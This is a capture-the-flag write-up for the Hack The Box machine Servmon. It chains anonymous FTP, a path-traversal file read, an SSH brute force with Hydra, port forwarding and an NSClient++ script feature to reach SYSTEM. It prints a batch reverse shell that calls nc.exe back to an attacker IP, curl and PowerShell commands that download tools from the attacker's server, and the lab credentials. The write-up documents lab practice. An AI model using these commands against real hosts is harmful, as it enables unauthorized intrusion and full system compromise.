#box #LFI #bruteforce #RCE #portForwarding #NSClient #ReverseShell 

Servmon is a box that at first presents an overwhelming amount of open ports which might scare at first but that in the end reveals the vulnerability lying on a service hosted on port **:80**. On port :80 an application called NVMS-1000 is hosted, used as a monitoring software. The software has a vulnerability permitting an attacker to perform a LFI. Combining this LFI with an anonymous access granted on the FTP on which we discover sensible information we're able to gain a foothold on the machine by recovering the credentials of the user's Nadine (within a bit of brute-forcing). Once on the machine, we discover the presence of a software called NSClient++, used as a monitoring software on which we can also configure custom scripts to be ran on. Also NSClient++, looking online, has a vulnerability that permits an Authenticated RCE. By lurking in the NSClient++ folder we're able to recover the NSClient++ password and then set up a script to be ran within NSClient++, granting us NT AUTHORITY\SYSTEM. 

>During the execution I've discovered an issue that prevents the endpoint to be working with Firefox, it has some issue with loading. That's why I used the HTB's pwnbox to properly perform privilege escalation since I had trouble installing chromium / chrome on kali's container

## Nmap

After a nmap scan we're overwhelmed by all the open ports found. We realize 3 interesting ports, though. 
* :21
* :80
* :8443

```bash
Nmap scan report for 10.129.11.160
Host is up (0.045s latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp   open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
| http-title: NSClient++
|_Requested resource was /index.html
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|_    Location: /index.html
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.95%I=7%D=4/20%Time=68055CF2%P=x86_64-pc-linux-gnu%r(NULL
SF:,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
SF:20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20X
SF:HTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/D
SF:TD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.
SF:org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\
SF:x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x2
SF:0\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")
SF:%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
SF:n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\
SF:x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xh
SF:tml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1
SF:999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x
SF:20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20
SF:\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RT
SF:SPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
SF:\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\
SF:.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
SF:transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/x
SF:html\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x2
SF:0<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\
SF:x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.95%T=SSL%I=7%D=4/20%Time=68055CFB%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
SF:)%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDo
SF:cument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x20404\r\nCo
SF:ntent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(RTSPRequest,36,
SF:"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20fo
SF:und")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\
SF:nDocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-04-20T20:47:44
|_  start_date: N/A
```

## FTP

We realize that we have anonymous access to FTP, thus we access it accordingly with anonymous login. Inside of it we discover the presence of a folder `/Users` in which we find two interesting files.
The first one `Confidential.txt` recites:

```text
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards
```

The second one is a list of notes:

```text
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

We save those two files for later and start looking somewhere else.
## :80

We discover that on port :80 a service called NVMS-1000 is running. Not knowing exactly what it is we look for it online and we discover it is a monitoring system. Further on we discover it suffered an Unauthenticated LFI vulnerability [CVE-2019-20085](https://www.exploit-db.com/exploits/47774).
Catching the text reported from `Confidential.txt` we try to obtain the passwords.txt file assumingly on Nathan's desktop by performing a `GET /../../../../../Users/Nathan/Desktop/passwords.txt`, obtaining a response containing a list of passwords.

![[attachments/servmon-writeup-1.webp]]

We try to perform a bruteforce with hydra by authenticating with the user's `Nathan`, without success

```bash
hydra -l nathan -P passwords.txt ssh://10.129.11.160
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-22 17:37:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking ssh://10.129.11.160:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-22 17:37:43
```

Once entering in FTP, inside the `Users` folder, we discovered the presence of a second user; `Nadine`.

![[attachments/servmon-writeup-2.webp]]

We decide to perform the same bruteforce on `Nadine` to check whether one of those passwords is going to give us a foothold, succeeding:
```bash
[172.17.0.2|10.10.16.31] [root] [/home/fygonacci/Servmon] > hydra -l nadine -P nadine_psw.txt ssh://10.129.11.160
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-22 17:41:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking ssh://10.129.11.160:22/
[22][ssh] host: 10.129.11.160   login: nadine   password: L1k3B1gBut7s@W0rk # GOTCHA!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-22 17:41:14
```

## Foothold and reconnaissance

We authenticate in SSH with the discovered user's `ssh nadine@10.129.11.160` and input the password `L1k3B1gBut7s@W0rk`.
Once inside the machine, we discover, also within the help of the `Notes to do.txt` file found on the FTP that a tool called NSClient++ is present. We get inside `C:\Program Files\NSClient++` to gain further understanding of the tool.
By looking up for some configurations, and through nmap, we discover that this software is hosted on port **:8443**, we get there to gain some information about it.

### :8443

The tool hosted on port :8443 struggles in its loading, we decide to hop on the pwnbox to check out whether things change, and we then decide to opt for `chromium` rather than firefox, fixing the loading issues.
The page shows a login, but we didn't find anything that reconduct us to a password yet. By looking online we discover that also this tool has a [vulnerability](https://www.exploit-db.com/exploits/46802) (Authenticated, this time) that grants us RCE. The vulnerability, strangely, doesn't have any CVE assigned.

The vulnerability itself reveals that it seems to be possible to gain the administrator password from the file `C:\Program Files\NSClient++\nsclient.ini` file, by printing it out on the machine we discover the effective existence of it: `ew2x6SsGTxjRwXOT`

We then use the password to authenticate to the platform, but we receive a `403 Your not allowed` message

![[attachments/servmon-writeup-3.webp]]

We lately discover, throughout the `nsclient.ini` that a further setting is set, allowing only connections from 127.0.0.1 to be allowed

![[attachments/servmon-writeup-4.webp]]

At this point, we decide to perform a local port forwarding that will bind a port of our choice from our machine to :8443 on the target machine. This will grant us a direct connection by simulating that we're connecting, from our host, to port 8443 "internally".

`ssh -L 8443:127.0.0.1:8443 nadine@10.129.11.160`

That will change the things since now we won't have to connect to `https://10.129.11.160:8443` any longer to reach NSClient++, but we'll now be able to connect to `https://127.0.0.1:8443` to reach the same endpoint.

```schema
+-------------------+      SSH Tunnel       +-------------------+       +---------------------+
|   Your Machine    |  ==================>  | SSH Server (Bastion)| ---> | Internal Machine    |
| localhost:8080    |                       |    ssh.example.com  |       | 192.168.1.10:3000   |
+-------------------+                       +-------------------+       +---------------------+
         |                                               |
   Access via browser:                                   |
     http://localhost:8080                               |
                                                         |
SSH Tunnel command:                                      |
ssh -L 8080:192.168.1.10:3000 user@ssh.example.com       |
```

By now reaching `https://127.0.0.1:8443` and input the password `ew2x6SsGTxjRwXOT` we'll now be able to authenticate successfully.

### Configuring a script and getting `NT AUTHORITY\SYSTEM`

By following the [vulnerability](https://www.exploit-db.com/exploits/46802) it tells us to configure a new script, which is a `bat` script and it also mention `nc.exe` to be present on the target machine. We search online for a **bat reverse shell**, finding the following [one](https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet/blob/master/reverse-shell.bat).
We download both [reverse-shell.bat](https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet/blob/master/reverse-shell.bat) and [nc.exe](https://github.com/int0x33/nc.exe/blob/master/nc.exe) on our attacking machine, we update the shell to be compliant to our attacking machine

```bash title:"Update reverse shell"
@echo off
C:\Users\Nadine\Desktop\nc.exe -e cmd 10.10.14.140 1337
PAUSE
exit
```

and then we host a python server on port `8000`.
We then perform two curl requests on the victim machine to catch the two files and store them in Nadine's desktop
```bash
curl http://10.10.14.140:8000/nc.exe -o C:\Users\Nadine\Desktop\nc.exe
curl http://10.10.14.140:8000/lapislazzuli.bat -o C:\Users\Nadine\Desktop\lapislazzuli.bat # to not refer clearly to the reverse shell itself
```

We could also use powershell for the same purpose

```powershell
IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.140:8000/nc.exe','C:\Users\Nadine\Desktop\nc.exe')
IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.140:8000/lapislazzuli.bat','C:\Users\Nadine\Desktop\lapislazzuli.bat')
```

At this point, we create a new script on NSClient++ from `Settings > Scripts` (we can do this since CheckExternalScripts is already enabled, otherwise we'd have had to enable it).
The GUI doesn't help at all, following a configuration of how it has been made

![[attachments/servmon-writeup-5.webp]]

Done that, we'll have to click on `Control > Reload` to properly refresh NSClient++ configuration (#it will logs us out but we'll be able to login with the same password).
Once logged in again, we should be able to find the script properly added inside the `scripts` folder

![[attachments/servmon-writeup-6.webp]]

We're also able to retrieve the same script in the `Queries` tab. From there, we'll be able to execute it manually from the `Run` option.
Before doing so, we start up a listener `nc -lvnp 1337` and we then Run the script, obtaining `NT AUTHORITY\SYSTEM`.

![[attachments/servmon-writeup-7.webp]]